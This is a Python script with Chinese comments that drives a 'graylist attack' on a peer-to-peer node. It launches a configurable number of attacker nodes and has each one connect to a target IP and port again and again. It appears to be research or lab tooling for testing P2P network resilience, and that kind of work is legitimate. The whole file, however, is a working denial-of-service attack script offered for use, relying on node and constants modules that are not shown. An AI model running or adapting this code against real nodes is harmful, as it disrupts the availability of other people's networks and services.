from typing import cast

import constants
from node import Node, run_node

graylist_attack_node_list = []

# Graylist attack本质上是一个持续性的攻击，而不是像connection reset attack那样的一次一次的攻击
def GraylistAttack(target_ip: str, target_port: int, attack_node_num: int = 20):
    global graylist_attack_node_list
    # 启动一定数量的节点，先运行起来
    graylist_attack_node_list = run_node(attack_node_num)
    # 再调用他们的connect_to函数，主动连接目标节点
    for node in graylist_attack_node_list:
        node = cast(Node, node)
        while not node.connect_to(target_ip, target_port, False):
            continue
    print(f"Start {len(graylist_attack_node_list)} graylist attack node.")
    

if __name__ == "__main__":
    while True:
        print("Please enter a command (1-2) or 'q' to quit:")
        print("1: Graylist attack")
        print("2: Show current graylist attack nodes")
        
        command = input("Enter your command: \n")
        
        if command == "1":
            target_ip = input(f"Target ip (default: {constants.target_node_ip}): ")
            target_port = input(f"Target port (default: {constants.target_p2p_bind_port}): ")
            if target_ip == "" and target_port == "":
                target_ip = constants.target_node_ip
                target_port = constants.target_p2p_bind_port
            attack_node_num = input(f"Attack node num (default 20): ")
            if attack_node_num == "":
                attack_node_num = 20
            GraylistAttack(target_ip, int(target_port), int(attack_node_num))
            continue
        if command == "2":
            # 查看当前的
            print(f"Current graylist attack node num: {len(graylist_attack_node_list)}.")
            continue
        if command == "q":
            print("Exiting the program.")
            for node in graylist_attack_node_list:
                node.stop()
            break
        else:
            print("Invalid command. Please enter a number between 1-3 or 'q' to quit.")
            









